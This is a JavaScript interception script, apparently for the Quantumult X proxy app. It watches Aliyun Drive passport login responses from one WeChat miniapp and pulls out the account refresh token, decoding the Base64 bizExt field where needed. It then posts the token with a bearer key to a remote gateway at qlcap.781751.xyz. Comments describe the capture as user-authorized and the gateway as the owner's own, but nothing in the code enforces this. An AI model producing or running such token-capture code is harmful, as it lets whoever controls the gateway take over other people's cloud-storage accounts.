/* Exact user-authorized Aliyun passport miniapp login response bootstrap.
 * No raw response/body/bizExt is transmitted or persisted. Only a structurally
 * valid 32-256 char refreshToken candidate travels to the owner's private gateway.
 * If no valid refresh token, send only safe request/response FIELD NAMES.
 */
'use strict';
const P='qlcap_v1_',GATE='https://qlcap.781751.xyz:58443';
const APP='wxf86f0a56fa23241f';
const TARGET='https://passport.aliyundrive.com/mini_program/login.do';
const BUILD='alipan-passport-20261119-r1';
function get(k){return $prefs.valueForKey(P+k)||'';}
function put(k,v){return $prefs.setValueForKey(String(v),P+k);}
function done(){if(typeof $done==='function')$done({});}
function header(h,n){
 const k=Object.keys(h||{}).find(x=>x.toLowerCase()===n);
 return k?String(h[k]):'';
}
function jsonObject(val){
 if(val && typeof val==='object' && !Array.isArray(val))return val;
 if(typeof val==='string' && val.length<160000){
  try{
   const v=JSON.parse(val);
   return v && typeof v==='object' && !Array.isArray(v)?v:null;
  }catch(_){}
 }
 return null;
}
function decodeB64(str){
 if(typeof str!=='string' || str.length<32 || str.length>200000 ||
    !/^[A-Za-z0-9+/_=-]+$/.test(str))return null;
 const alphabet='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
 const raw=str.replace(/-/g,'+').replace(/_/g,'/').replace(/=+$/,'');
 if(raw.length%4===1)return null;
 let output='',bits=0,count=0;
 for(let i=0;i<raw.length;i++){
  const n=alphabet.indexOf(raw[i]);if(n<0)return null;
  bits=(bits<<6)|n;count+=6;
  if(count>=8){
   count-=8;
   output+=String.fromCharCode((bits>>count)&255);
   if(output.length>150000)return null;
  }
 }
 return output;
}
function candidateNodes(doc){
 const result=[];
 function add(obj){
  const o=jsonObject(obj);
  if(o && result.indexOf(o)<0 && result.length<12)result.push(o);
 }
 add(doc);
 const d=jsonObject(doc);
 if(d){
  add(d.data);add(d.result);add(d.content);
  const content=jsonObject(d.content),data=jsonObject(d.data);
  if(content){add(content.data);add(content.result);}
  if(data){add(data.data);add(data.result);}
 }
 return result;
}
function extractToken(doc){
 const nodes=candidateNodes(doc);
 for(const n of nodes){
  for(const k of ['refreshToken','refresh_token']){
   const t=n[k];
   if(typeof t==='string' && /^[A-Za-z0-9_-]{32,256}$/.test(t))return t;
  }
  for(const k of ['bizExt','biz_ext']){
   const raw=decodeB64(n[k]);
   if(!raw)continue;
   // bizExt is an opaque Base64 login payload; extract only the token.
   const decoded=jsonObject(raw);
   if(!decoded)continue;
   for(const obj of candidateNodes(decoded)){
    for(const tkey of ['refreshToken','refresh_token']){
     const t=obj[tkey];
     if(typeof t==='string' && /^[A-Za-z0-9_-]{32,256}$/.test(t))return t;
    }
   }
  }
 }
 return null;
}
function fieldNames(doc){
 const keys=[],seen=new Set();
 const nodes=candidateNodes(doc);
 function add(k){
  if(typeof k==='string' && /^[A-Za-z_][A-Za-z0-9_.-]{0,55}$/.test(k) &&
      !seen.has(k) && keys.length<40){seen.add(k);keys.push(k);}
 }
 const root=nodes[0];
 if(root){
  for(const k of Object.keys(root).slice(0,30))add(k);
  for(const k of ['content','data','result']){
   const child=jsonObject(root[k]);
   if(child){
    for(const v of Object.keys(child).slice(0,18))add(k+'.'+v);
   }
  }
 }
 return keys;
}
function fingerprint(s){
 let hash=2166136261;
 for(let i=0;i<s.length;i++){hash^=s.charCodeAt(i);hash=Math.imul(hash,16777619);}
 return (hash>>>0).toString(16);
}
function main(){
 if(get('armed')==='0'||get('alipan_passport_armed')==='0')return done();
 const req=(typeof $request!=='undefined'&&$request)||{};
 const resp=(typeof $response!=='undefined'&&$response)||null;
 if(!resp || String(req.url||'').split(/[?#]/)[0]!==TARGET ||
    String(req.method||'').toUpperCase()!=='POST' ||
    Number(resp.statusCode||0)!==200)return done();
 const referer=header(req.headers,'referer');
 const app=/servicewechat\.com\/(wx[0-9a-f]{16})\//i.exec(referer);
 if(!app || app[1].toLowerCase()!==APP)return done();
 const gateway=get('url').replace(/\/+$/,''),key=get('token');
 if(gateway!==GATE||key.length<32){
  put('alipan_passport_status','gateway_missing');return done();
 }
 const now=Date.now();
 if(get('alipan_passport_build')!==BUILD){
  put('alipan_passport_build',BUILD);
  put('alipan_passport_seen','');
 }
 let doc=jsonObject(resp.body);
 if(!doc){put('alipan_passport_status','response_not_json');return done();}
 const rt=extractToken(doc);
 const keys=fieldNames(doc);
 const tokenHash=rt?fingerprint(rt):'';
 const previous=get('alipan_passport_seen');
 if(rt && tokenHash===previous)return done();
 const payload=rt?{
   v:1,type:'alipan_passport_refresh_v1',service:'alipan',
   url:TARGET,wx_appid:APP,captured_at:now,
   refresh_token:rt
 }:{
   v:1,type:'qx_structure_v1',host:'passport.aliyundrive.com',
   path:'/mini_program/login.do',method:'POST',stage:'response_body',
   query_keys:[],header_keys:[],body_keys:keys,
   body_length:null,status:200,wx_appid:APP,wx_appid_source:'referer'
 };
 let ended=false;
 function finish(reason,accepted){
  if(ended)return;ended=true;
  put('alipan_passport_status',reason);
  put('alipan_passport_last_at',new Date().toISOString());
  if(accepted && rt)put('alipan_passport_seen',tokenHash);
  done();
 }
 const timer=setTimeout(()=>finish('timeout',false),2700);
 try{
  $task.fetch({url:GATE+'/trace/v1/ingest',method:'POST',
    opts:{policy:'direct'},
    headers:{Authorization:'Bearer '+key,'Content-Type':'application/json'},
    body:JSON.stringify(payload)})
  .then(r=>{
   clearTimeout(timer);
   let v={};try{v=JSON.parse(r.body||'{}')}catch(_){}
   const accepted=Number(r.statusCode||r.status||0)===200 && v.accepted===true;
   finish(accepted?(rt?'credential_queued':'schema_only'):'gateway_rejected',accepted);
  }).catch(()=>{clearTimeout(timer);finish('network_error',false)});
 }catch(_){clearTimeout(timer);finish('script_error',false)}
}
try{main()}catch(_){done()}
